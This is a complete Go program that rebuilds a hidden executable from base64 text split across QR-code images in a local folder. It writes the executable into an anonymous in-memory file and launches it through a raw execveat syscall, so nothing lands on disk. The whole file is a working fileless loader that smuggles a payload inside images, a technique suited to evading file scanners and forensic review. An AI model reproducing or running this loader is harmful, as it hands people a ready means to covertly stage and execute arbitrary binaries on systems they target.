package main

import (
	"encoding/base64"
	"fmt"
	"image"
	_"image/png"
	"io/ioutil"
	"os"
	"unsafe"
	"path/filepath"
	"golang.org/x/sys/unix"

	"github.com/makiuchi-d/gozxing"
	"github.com/makiuchi-d/gozxing/qrcode"
)

// AT_EMPTY_PATH is the flag telling execveat to use the FD even if the path is "".
const AT_EMPTY_PATH = 0x1000

// decodeQRCode decodes a QR code from an image file and returns the decoded text.
func decodeQRCode(filename string) (string, error) {
	file, err := os.Open(filename)
	if err != nil {
		return "", err
	}
	defer file.Close()

	img, _, err := image.Decode(file)
	if err != nil {
		return "", err
	}

	bmp, err := gozxing.NewBinaryBitmapFromImage(img)
	if err != nil {
		return "", err
	}

	qrReader := qrcode.NewQRCodeReader()
	result, err := qrReader.Decode(bmp, nil)
	if err != nil {
		return "", err
	}

	return result.GetText(), nil
}

// executeBinaryInMemory executes the given binary data in memory.
func executeBinaryInMemory(binaryData []byte) error {
	fd, err := unix.MemfdCreate("memexec", 0)
	if err != nil {
		return fmt.Errorf("MemfdCreate error: %v", err)
	}
	defer unix.Close(fd)

	n, err := unix.Write(fd, binaryData)
	if err != nil || n != len(binaryData) {
		return fmt.Errorf("Write error: %v (wrote %d of %d)", err, n, len(binaryData))
	}

	if off, err := unix.Seek(fd, 0, 0); err != nil || off != 0 {
		return fmt.Errorf("Seek error: %v", err)
	}

	argv := []string{"memexec_binary"}
	envp := os.Environ()

	return execveatEmptyPath(fd, argv, envp)
}

// execveatEmptyPath calls execveat(fd, "", argv, envp, AT_EMPTY_PATH).
func execveatEmptyPath(fd int, argv []string, envp []string) error {
	argvPtrs := make([]*byte, len(argv)+1)
	for i, s := range argv {
		cstr, err := unix.BytePtrFromString(s)
		if err != nil {
			return fmt.Errorf("invalid argv string %q: %w", s, err)
		}
		argvPtrs[i] = cstr
	}

	envpPtrs := make([]*byte, len(envp)+1)
	for i, e := range envp {
		cstr, err := unix.BytePtrFromString(e)
		if err != nil {
			return fmt.Errorf("invalid env string %q: %w", e, err)
		}
		envpPtrs[i] = cstr
	}

	emptyStringPtr, _ := unix.BytePtrFromString("")

	const SYS_EXECVEAT = unix.SYS_EXECVEAT
	r1, _, e := unix.Syscall6(
		SYS_EXECVEAT,
		uintptr(fd),
		uintptr(unsafe.Pointer(emptyStringPtr)),
		uintptr(unsafe.Pointer(&argvPtrs[0])),
		uintptr(unsafe.Pointer(&envpPtrs[0])),
		uintptr(AT_EMPTY_PATH),
		0,
	)
	if e != 0 {
		return e
	}
	if r1 != 0 {
		return fmt.Errorf("execveat returned %d unexpectedly", r1)
	}
	return nil
}

func main() {
	imageDir := "./img"
	files, err := ioutil.ReadDir(imageDir)
	if err != nil {
		fmt.Println("Error reading images directory:", err)
		return
	}

	var combinedBase64 string
	for _, file := range files {
		if file.IsDir() {
			continue
		}

		filePath := filepath.Join(imageDir, file.Name())
		decodedPart, err := decodeQRCode(filePath)
		if err != nil {
			fmt.Printf("Error decoding QR code %s: %v\n", file.Name(), err)
			return
		}
		combinedBase64 += decodedPart
	}

	decodedBytes, err := base64.StdEncoding.DecodeString(combinedBase64)
	if err != nil {
		fmt.Println("Error decoding base64:", err)
		return
	}

	err = executeBinaryInMemory(decodedBytes)
	if err != nil {
		fmt.Println("Error executing binary in memory:", err)
		return
	}

	fmt.Println("Binary executed successfully in memory.")
}
